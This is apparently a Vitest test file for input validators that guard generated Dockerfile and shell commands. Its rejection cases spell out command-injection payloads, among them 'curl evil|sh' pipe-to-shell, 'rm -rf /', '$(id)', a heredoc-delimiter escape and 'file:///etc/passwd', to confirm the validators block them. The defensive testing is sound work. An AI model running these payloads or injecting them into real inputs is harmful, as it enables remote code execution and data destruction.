import { describe, expect, it } from "vitest";
import { ValidationError } from "../../core/errors.js";
import {
  KNOWN_HOSTS_HEREDOC_DELIMITER,
  assertAptPackageName,
  assertDockerImageRef,
  assertGoModulePath,
  assertIndexUrl,
  assertKnownHosts,
  assertLanguageVersion,
  assertNoControlChars,
  assertPackageName,
  assertPackageVersionSpec,
} from "../../core/validation.js";

describe("assertDockerImageRef", () => {
  it("accepts registry refs with tags, ports, and digests", () => {
    const valid = [
      "debian",
      "debian:12-slim",
      "ghcr.io/org/img:1.2",
      "registry.io:443/team/app@sha256:" + "a".repeat(64),
      "python:3.12-slim",
    ];
    for (const ref of valid) {
      expect(() => assertDockerImageRef(ref)).not.toThrow();
    }
  });

  it("rejects injection payloads and malformed refs", () => {
    const invalid = [
      "",
      "debian:12\nRUN curl evil|sh",
      "img; rm -rf /",
      "img$(touch /x)",
      "img`id`",
      'img" ',
      "img arg",
      "@sha256:" + "a".repeat(64),
      "img@sha256:zzzz",
    ];
    for (const ref of invalid) {
      expect(() => assertDockerImageRef(ref)).toThrow(ValidationError);
    }
  });
});

describe("assertLanguageVersion", () => {
  it("accepts realistic versions and codenames", () => {
    for (const version of [
      "3.12",
      "3.12.7",
      "22",
      "1.82.0",
      "lts-jod",
      "pypy3.10-7.3.14",
      "beta",
    ]) {
      expect(() => assertLanguageVersion(version, "node")).not.toThrow();
    }
  });

  it("rejects shell metacharacters", () => {
    const invalid = ["3.12; curl evil|sh", "$(id)", "1.0 /tmp", "3\nRUN x", ""];
    for (const version of invalid) {
      expect(() => assertLanguageVersion(version, "python")).toThrow(ValidationError);
    }
  });
});

describe("assertAptPackageName", () => {
  it("accepts standard package names", () => {
    for (const name of [
      "git",
      "build-essential",
      "libssl-dev",
      "ca-certificates",
      "postgresql16",
    ]) {
      expect(() => assertAptPackageName(name)).not.toThrow();
    }
  });

  it("rejects uppercase, spaces, and shell characters", () => {
    for (const name of ["Git", "curl wget", "pkg;rm", "", "pk$g"]) {
      expect(() => assertAptPackageName(name)).toThrow(ValidationError);
    }
  });
});

describe("assertPackageName", () => {
  it("accepts bare and scoped names", () => {
    for (const name of ["typescript", "@angular/cli", "@scope/pkg.name", "left-pad"]) {
      expect(() => assertPackageName(name, "npm")).not.toThrow();
    }
  });

  it("rejects injection payloads", () => {
    for (const name of ["pkg; rm -rf /", "@scope/", "pkg$(id)", "pkg && id", ""]) {
      expect(() => assertPackageName(name, "npm")).toThrow(ValidationError);
    }
  });
});

describe("assertGoModulePath", () => {
  it("accepts dotted module paths", () => {
    expect(() => assertGoModulePath("golang.org/x/tools/gopls")).not.toThrow();
    expect(() => assertGoModulePath("github.com/user/repo/cmd/tool")).not.toThrow();
  });

  it("rejects shell characters", () => {
    for (const name of ["mod;id", "path/to/..", "a b", ""]) {
      expect(() => assertGoModulePath(name)).toThrow(ValidationError);
    }
  });
});

describe("assertPackageVersionSpec", () => {
  it("accepts exact pins and simple ranges", () => {
    for (const version of ["1.2.3", "^4.0.0", "~2.1", "2024-01-01", "v10"]) {
      expect(() => assertPackageVersionSpec(version, "npm")).not.toThrow();
    }
  });

  it("rejects ranges with shell-active characters or whitespace", () => {
    for (const version of [">= 1.0", "1.0 || 2.0", "1;id", "`id`", ""]) {
      // Empty string means "absent": accepted by contract.
      if (version === "") continue;
      expect(() => assertPackageVersionSpec(version, "pip")).toThrow(ValidationError);
    }
    expect(() => assertPackageVersionSpec("", "npm")).not.toThrow();
  });
});

describe("assertIndexUrl", () => {
  it("accepts plain http(s) registry URLs", () => {
    for (const url of [
      "https://pypi.org/simple",
      "https://registry.npmjs.org",
      "http://internal-registry:8080/simple/pkg",
    ]) {
      expect(() => assertIndexUrl(url, "pip")).not.toThrow();
    }
  });

  it("rejects non-http schemes and shell-active characters", () => {
    for (const url of [
      "ftp://x/y",
      "https://x/y`id`",
      "https://x/y?a=1&cmd=|ls",
      "https://x $(id)",
      "file:///etc/passwd",
      "",
    ]) {
      expect(() => assertIndexUrl(url, "npm")).toThrow(ValidationError);
    }
  });
});

describe("assertKnownHosts", () => {
  it("accepts normal known-hosts material", () => {
    expect(() =>
      assertKnownHosts("github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHashValueHere"),
    ).not.toThrow();
    expect(() => assertKnownHosts("host-a key-a\nhost-b key-b")).not.toThrow();
  });

  it("rejects the heredoc delimiter line and exotic control characters", () => {
    expect(() => assertKnownHosts(`host key\n${KNOWN_HOSTS_HEREDOC_DELIMITER}\nrm -rf /`)).toThrow(
      /reserved heredoc delimiter/,
    );
    expect(() => assertKnownHosts("host\x07key")).toThrow(/control characters/);
  });
});

describe("assertNoControlChars", () => {
  it("allows ordinary text including tabs-free unicode", () => {
    expect(() => assertNoControlChars("héllo wörld ✓", "value")).not.toThrow();
  });

  it("rejects newlines and other control characters", () => {
    for (const value of ["line1\nRUN curl evil|sh", "a\rb", "null\u0000byte", "\u001B[31m"]) {
      expect(() => assertNoControlChars(value, "value")).toThrow(ValidationError);
    }
  });
});
